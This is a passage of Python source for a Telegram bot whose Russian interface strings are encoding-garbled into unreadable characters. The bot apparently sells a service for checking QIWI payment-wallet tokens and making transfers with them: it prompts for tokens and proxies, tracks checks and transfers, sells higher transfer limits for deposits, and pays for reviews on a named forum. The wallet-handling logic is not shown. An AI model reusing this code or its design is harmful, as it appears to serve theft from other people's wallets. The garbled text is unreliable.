                bot.send_message(tid, f"{proxy_details}–í–≤–µ–¥–∏—Ç–µ —Ç–æ–∫–µ–Ω QIWI –∫–æ—à–µ–ª—å–∫–∞ –∏–ª–∏ –≤—ã–±–µ—Ä–∏—Ç–µ –∏–∑ –ø–æ—Å–ª–µ–¥–Ω–∏—Ö:", parse_mode='markdown', reply_markup=kb_tokens)
                if not qiwi.users_info.get(tid):
                    qiwi.reset(tid)
                qiwi.status(tid, "waiting_token2")
            elif message.text == "üëæ –†–∞–∑—Ä–∞–±–æ—Ç—á–∏–∫":
                # –ü–æ–ª—É—á–∞–µ–º –∞–∫—Ç—É–∞–ª—å–Ω—ã–µ –∫–æ–Ω—Ç–∞–∫—Ç—ã –¥–ª—è —Å–≤—è–∑–∏ —Å –∞–¥–º–∏–Ω–æ–º.
                if qiwi.load_config() and qiwi.tg_admins:
                    admin_text = '–ê–∫–∫–∞—É–Ω—Ç—ã –∞–¥–º–∏–Ω–∞:\n@' + '\n@'.join(qiwi.tg_admins)
                    try:
                        bot.send_photo(tid, requests.get(config.MONKEY_URL).content, caption=admin_text, reply_markup=kb_main)
                    except:
                        bot.send_message(tid, admin_text, reply_markup=kb_main)
                else:
                    bot.send_message(tid, 'üö´ –û—à–∏–±–∫–∞ - –Ω–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –∫–æ–Ω—Ç–∞–∫—Ç—ã –∞–¥–º–∏–Ω–∞!', reply_markup=kb_main)
            elif message.text == "üìß Feedback":
                idea_text = "–†–∞—Å—Å–∫–∞–∂–∏, —á—Ç–æ –±—ã —Ç—ã —Ö–æ—Ç–µ–ª —É–≤–∏–¥–µ—Ç—å –≤ –¥–∞–Ω–Ω–æ–º –±–æ—Ç–µ.\n–ü—Ä–µ–¥–ª–æ–∂–µ–Ω–∏—è –æ—Ç–ø—Ä–∞–≤–ª—è—é—Ç—Å—è *–∞–Ω–æ–Ω–∏–º–Ω–æ*. –¢–∞–∫–∂–µ –º–æ–∂–µ—à—å –Ω–∞–ø–∏—Å–∞—Ç—å –ª–∏—á–Ω–æ –∞–¥–º–∏–Ω—É (–≤ –≥–ª–∞–≤–Ω–æ–º –º–µ–Ω—é –µ—Å—Ç—å –∫–Ω–æ–ø–∫–∞)."
                bot.send_message(tid, idea_text, parse_mode='markdown', reply_markup=kb_cancel)
                if not qiwi.users_info.get(tid):
                    qiwi.reset(tid)
                qiwi.status(tid, "idea")
            elif message.text == "üîß –ù–∞—Å—Ç—Ä–æ–π–∫–∏":
                bot.send_message(tid, "–ü–µ—Ä–µ—Ö–æ–¥–∏–º –≤ –Ω–∞—Å—Ç—Ä–æ–π–∫–∏!", reply_markup=kb_options)
            elif message.text == "üí∞ –ü–æ–ø–æ–ª–Ω–∏—Ç—å –±–∞–ª–∞–Ω—Å":
                deposit_text = f"–í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É –¥–ª—è –¥–µ–ø–æ–∑–∏—Ç–∞ (10 - 50000):\n–¢–µ–∫—É—â–∏–π –∫—É—Ä—Å: *1–∫{int(1 / config.SELLER_PERCENT)}*.\n\n" + \
                    '–ë–æ–Ω—É—Å–Ω–∞—è –ø—Ä–æ–≥—Ä–∞–º–º–∞:\n–æ—Ç 100—Ä - –±–æ–Ω—É—Å *10%*\n–æ—Ç 500—Ä - –±–æ–Ω—É—Å *15%*\n–æ—Ç 1000—Ä - –±–æ–Ω—É—Å *20%*\n–æ—Ç 5000—Ä - –±–æ–Ω—É—Å *30%*'
                bot.send_message(tid, deposit_text, parse_mode='markdown', reply_markup=kb_deposit)
                qiwi.status(tid, "deposit")
            elif message.text == "üè¶ –ú–æ–π –±–∞–ª–∞–Ω—Å":
                try:
                    # –ë–µ—Å–ø–ª–∞—Ç–Ω—ã–µ.
                    free = config.FREE_RUBLES
                except:
                    free = 500
                try:
                    # –ö—É–ø–ª–µ–Ω–æ.
                    have = int(qiwi.users_balance[tid]["have"])
                    # –ü–æ—Ç—Ä–∞—á–µ–Ω–æ.
                    spent = int(qiwi.users_balance[tid]["spent"])
                    # –û—Å—Ç–∞–ª–æ—Å—å.
                    left = int(have + free - spent)
                except:
                    have = 0
                    spent = 0
                    left = int(have + free - spent)

                thanks_text = f'*–í–∞—à ID:* `{tid}`\n–ë–∞–ª–∞–Ω—Å: `{bue_numb(have)}`‚ÇΩ\n–ë–µ—Å–ø–ª–∞—Ç–Ω–æ: +`{bue_numb(free)}`‚ÇΩ\n\n–ü–æ—Ç—Ä–∞—á–µ–Ω–æ: `{bue_numb(spent)}`‚ÇΩ\n*–û—Å—Ç–∞–ª–æ—Å—å:* `{bue_numb(left)}`‚ÇΩ\n\n' + \
                    f'–ü–æ–¥–Ω–∏–º–∏—Ç–µ —Å–≤–æ–∏ –ª–∏–º–∏—Ç—ã –Ω–∞ –ø–µ—Ä–µ–≤–æ–¥—ã –ø–æ –∫—É—Ä—Å—É *1–∫{int(1 / config.SELLER_PERCENT)}*.\n_–ü–æ–ø–æ–ª–Ω–µ–Ω–∏–µ –Ω–∞ 10‚ÇΩ -> –ø–æ–≤—ã—à–µ–Ω–∏–µ –ª–∏–º–∏—Ç–æ–≤ –Ω–∞ {round(10 / config.SELLER_PERCENT , 2)}‚ÇΩ_'
                bot.send_message(tid, thanks_text, parse_mode='markdown', reply_markup=kb_balance)
                bot.send_message(tid, "–í—ã–¥–∞–º `10'000`‚ÇΩ –∑–∞ –æ—Ç–∑—ã–≤ –ø–æ–¥ —Ç–µ–º–æ–π –Ω–∞ Lolz Guru —Å –∞–∫–∫–∞—É–Ω—Ç–∞, –Ω–∞ –∫–æ—Ç–æ—Ä–æ–º –±–æ–ª—å—à–µ 20 —Å–∏–º–ø.\n–ü–æ–¥—Ä–æ–±–Ω–µ–µ: *@depols*", parse_mode='markdown')
                try:
                    # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –∞–¥–º–∏–Ω—É.
                    if tid != qiwi.notification:
                        qiwi.notif_common_admin(notif_text='üè¶ *–ë–∞–ª–∞–Ω—Å –ø—Ä–æ—Å–º–æ—Ç—Ä–µ–Ω!*', telegram_id=tid, username=message.from_user.username, last_text=f'\n–ë–∞–ª–∞–Ω—Å: `{bue_numb(have)}`‚ÇΩ\n–ë–µ—Å–ø–ª–∞—Ç–Ω–æ: +`{bue_numb(free)}`‚ÇΩ\n–ü–æ—Ç—Ä–∞—á–µ–Ω–æ: `{bue_numb(spent)}`‚ÇΩ\n*–û—Å—Ç–∞–ª–æ—Å—å:* `{bue_numb(left)}`‚ÇΩ')
                except:
                    pass
            elif message.text == "üß≠ –ú–∞–Ω—É–∞–ª –ø–æ –±–æ—Ç—É": # TODO:
                bot.send_message(tid, '–†–∞–∑–¥–µ–ª –≤ —Ä–∞–∑—Ä–∞–±–æ—Ç–∫–µ!')
            elif message.text == "üìò –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è":
                bot.send_message(tid, '–í—ã–±–µ—Ä–∏—Ç–µ —Ä–∞–∑–¥–µ–ª:', reply_markup=kb_info)
            elif message.text == "ü§ñ –û –±–æ—Ç–µ":
                bot.send_message(tid, ABOUT_BOT, parse_mode='markdown', reply_markup=kb_main, disable_web_page_preview=True)
            elif message.text == "üìä –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞":
                # –í—ã–≤–æ–¥–∏–º –Ω–µ–º–Ω–æ–≥–æ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –±–æ—Ç–µ.
                try:
                    activity_info = qiwi.activity["info"]
                    static_text = '*–°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ –∑–∞ –≤—Å–µ –≤—Ä–µ–º—è.*\n\n' + \
                        f'–í—Å–µ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π: *{bue_numb(qiwi.user_count.get("count", "None"))}*\n' + \
                        f'–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π —Å –ø—Ä–æ–≤–µ—Ä–∫–∞–º–∏: *{bue_numb(qiwi.user_count.get("new_act_tokens", "None"))}*\n' + \
                        f'–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π —Å –ø–µ—Ä–µ–≤–æ–¥–∞–º–∏: *{bue_numb(qiwi.user_count.get("new_act_trans", "None"))}*\n' + \
                        f"–£–Ω–∏–∫–∞–ª—å–Ω—ã—Ö —Ç–æ–∫–µ–Ω–æ–≤: *{bue_numb(activity_info['tokens']['count'])}*\n\n" + \
                        f'–ü—Ä–æ–≤–µ—Ä–æ–∫: *{bue_numb(activity_info["checks"]["count"])}* –Ω–∞ *{bue_numb(activity_info["checks"]["sum"])}*‚ÇΩ\n' + \
                        f'–ü–µ—Ä–µ–≤–æ–¥–æ–≤: *{bue_numb(activity_info["transactions"]["count"])}* –Ω–∞ *{bue_numb(activity_info["transactions"]["sum"])}*‚ÇΩ\n\n' + \
                        f'_–ó–∞–∫–∞–∑–∞—Ç—å —Å–≤–æ–µ–≥–æ –±–æ—Ç–∞ (–∏–ª–∏ —Ä–µ–∫–ª–∞–º—É –≤ —ç—Ç–æ–º): {config.ADMIN_TG}_'
                    bot.send_message(tid, static_text, parse_mode='markdown', reply_markup=kb_main, disable_web_page_preview=True)
                except:
                    bot.send_message(tid, 'üö´ –û—à–∏–±–∫–∞ - –Ω–µ —É–¥–∞–ª–æ—Å—å –∑–∞–≥—Ä—É–∑–∏—Ç—å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é!', reply_markup=kb_main)
                else:
                    try:
                        if tid != qiwi.notification:
                            qiwi.notif_stat_admin(telegram_id=tid, username=message.from_user.username)
                    except:
                        pass
            else:
                bot.send_message(tid, '–Ø –Ω–µ –ø–æ–Ω–∏–º–∞—é, —á–µ–≥–æ —Ç—ã —Ö–æ—á–µ—à—å, –±–∞–∫–∞!', reply_markup=kb_main)

if __name__ == "__main__":
    print('[~] –ó–∞–≥—Ä—É–∂–∞–µ–º –Ω–∞—Å—Ç—Ä–æ–π–∫–∏...')
    if qiwi.load_config():
        # –ó–∞–≥—Ä—É–∂–∞–µ–º –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–∏–µ –Ω–∞—Å—Ç—Ä–æ–π–∫–∏.
        qiwi.load_users_info()
        # –ó–∞–≥—Ä—É–∂–∞–µ–º –±–∞–ª–∞–Ω—Å—ã –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π.
        qiwi.load_balances()
        # –ó–∞–≥—Ä—É–∂–∞–µ–º –ø—Ä–æ–∫—Å–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π.
        qiwi.load_proxy()
        print('[v] –ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–æ!')
        print()
        try:
            print('[~] –ó–∞–ø—É—Å–∫–∞—é –±–æ—Ç–∞... –ú–æ–∂–µ—à—å –ø–∏—Å–∞—Ç—å –±–æ—Ç—É –≤ Telegram!')
            bot.polling(none_stop=True, interval=0)
        except:
            print('[x] –ë–æ—Ç –∫—Ä–∞—à–Ω—É–ª—Å—è :c')
        print()
    else:
        print(f'[x] –ù–µ —É–¥–∞–ª–æ—Å—å –∑–∞–≥—Ä—É–∑–∏—Ç—å –∫–æ–Ω—Ñ–∏–≥.')
